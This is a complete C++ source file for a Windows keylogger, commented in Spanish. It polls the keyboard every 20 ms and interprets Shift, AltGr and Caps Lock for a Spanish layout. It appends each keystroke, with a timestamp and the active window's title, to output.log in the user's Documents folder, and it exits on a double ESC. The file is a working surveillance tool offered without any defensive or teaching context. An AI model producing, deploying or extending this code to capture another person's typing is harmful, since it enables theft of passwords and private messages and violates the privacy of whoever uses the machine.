#include <iostream>
#include <fstream>
#include <windows.h>
#include <shlobj.h>
#include <map>
#include <string>
#include <ctime>
#include <locale>
#include <codecvt>

// Mapeo de teclas base (para layout ESP/ESP-LATAM)
std::map<int, std::wstring> baseKeys = {
    { 'A',L"a" },{ 'B',L"b" },{ 'C',L"c" },{ 'D',L"d" },{ 'E',L"e" },
    { 'F',L"f" },{ 'G',L"g" },{ 'H',L"h" },{ 'I',L"i" },{ 'J',L"j" },
    { 'K',L"k" },{ 'L',L"l" },{ 'M',L"m" },{ 'N',L"n" },{ 'O',L"o" },
    { 'P',L"p" },{ 'Q',L"q" },{ 'R',L"r" },{ 'S',L"s" },{ 'T',L"t" },
    { 'U',L"u" },{ 'V',L"v" },{ 'W',L"w" },{ 'X',L"x" },{ 'Y',L"y" },{ 'Z',L"z" },
    { '0',L"0" },{ '1',L"1" },{ '2',L"2" },{ '3',L"3" },{ '4',L"4" },
    { '5',L"5" },{ '6',L"6" },{ '7',L"7" },{ '8',L"8" },{ '9',L"9" },
    { VK_SPACE,L" " },{ VK_OEM_COMMA,L"," },{ VK_OEM_PERIOD,L"." },
    { VK_OEM_MINUS,L"-" },{ VK_OEM_PLUS,L"+" },{ VK_OEM_2,L"/" },
    { VK_OEM_3,L"`" },{ VK_OEM_4,L"[" },{ VK_OEM_5,L"\\" },
    { VK_OEM_6,L"]" },{ VK_OEM_7,L"'" }
};

// Obtener hora
std::wstring getTimeStamp() {
    time_t now = time(0);
    struct tm t;
    localtime_s(&t, &now);
    wchar_t buf[10];
    wcsftime(buf, sizeof(buf), L"%H:%M:%S", &t);
    return std::wstring(buf);
}

// Obtener ventana activa
std::wstring getActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    wchar_t title[256] = { 0 };
    GetWindowTextW(hwnd, title, sizeof(title));
    return std::wstring(title);
}

int main() {
    // Ruta a Documentos
    char path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, path);
    wchar_t wpath[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, path, -1, wpath, MAX_PATH);
    std::wstring logFile = std::wstring(wpath) + L"\\output.log";

    std::wcout.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>()));
    std::map<int, bool> pressed;
    bool escOnce = false;

    std::wcout << L"Iniciado - Presiona ESC dos veces para salir.\n";

    while (true) {
        Sleep(20);
        std::wstring window = getActiveWindowTitle();
        std::wstring time = getTimeStamp();

        bool shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
        bool altgr = GetAsyncKeyState(VK_RMENU) & 0x8000;
        bool ctrl = GetAsyncKeyState(VK_CONTROL) & 0x8000;
        bool caps = GetKeyState(VK_CAPITAL) & 0x0001;

        for (std::map<int, std::wstring>::iterator it = baseKeys.begin(); it != baseKeys.end(); ++it) {
            int vk = it->first;
            std::wstring output = it->second;

            if (GetAsyncKeyState(vk) & 0x8000) {
                if (!pressed[vk]) {

                    // SHIFT
                    if (shift) {
                        if (output == L"1") output = L"!";
                        else if (output == L"2") output = L"\"";
                        else if (output == L"3") output = L"·";
                        else if (output == L"4") output = L"$";
                        else if (output == L"5") output = L"%";
                        else if (output == L"6") output = L"&";
                        else if (output == L"7") output = L"/";
                        else if (output == L"8") output = L"(";
                        else if (output == L"9") output = L")";
                        else if (output == L"0") output = L"=";
                        else if (output == L"+") output = L"*";
                        else if (output == L"[") output = L"{";
                        else if (output == L"]") output = L"}";

                        // Shift + / → ?
                        if (vk == VK_OEM_2) output = L"?";

                        // Shift + ' → ?
                        if (vk == VK_OEM_7) {
                            if (output == L"'") {
                                output = L"?";
                            }
                        }
                    }

                    // ALTGR
                    if (altgr) {
                        if (output == L"2") output = L"@";
                        else if (output == L"3") output = L"#";
                        else if (output == L"4") output = L"~";
                        else if (output == L"e" || output == L"E") output = L"€";
                    }

                    // MAYÚSCULAS según Shift ^ Caps
                    if (output.size() == 1 && iswalpha(output[0])) {
                        if (shift ^ caps) {
                            output[0] = towupper(output[0]);
                        }
                    }

                    // Escribir en el log
                    std::wofstream file(logFile.c_str(), std::ios::app);
                    file.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>()));
                    file << L"[" << time << L"] Tecla: " << output << L" (Ventana activa: " << window << L")\n";
                    file.close();

                    pressed[vk] = true;
                }
            } else {
                pressed[vk] = false;
            }
        }

        // Teclas especiales
        struct { int vk; std::wstring name; } specials[] = {
            { VK_SHIFT, L"SHIFT" }, { VK_CONTROL, L"CTRL" },
            { VK_RCONTROL, L"CTRL" }, { VK_MENU, L"ALT" },
            { VK_RMENU, L"ALTGR" }, { VK_CAPITAL, L"CAPS LOCK" }
        };

        for (int i = 0; i < sizeof(specials)/sizeof(specials[0]); ++i) {
            int vk = specials[i].vk;
            std::wstring name = specials[i].name;
            if (GetAsyncKeyState(vk) & 0x8000) {
                if (!pressed[vk]) {
                    std::wofstream file(logFile.c_str(), std::ios::app);
                    file.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>()));
                    file << L"[" << time << L"] Tecla especial: " << name
                         << L" (Ventana activa: " << window << L")\n";
                    file.close();
                    pressed[vk] = true;
                }
            } else {
                pressed[vk] = false;
            }
        }

        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
            if (escOnce) {
                std::wcout << L"Saliendo...\n";
                break;
            } else {
                escOnce = true;
                std::wcout << L"Presiona ESC otra vez para salir.\n";
                Sleep(300);
            }
        } else {
            escOnce = false;
        }
    }

    return 0;
}
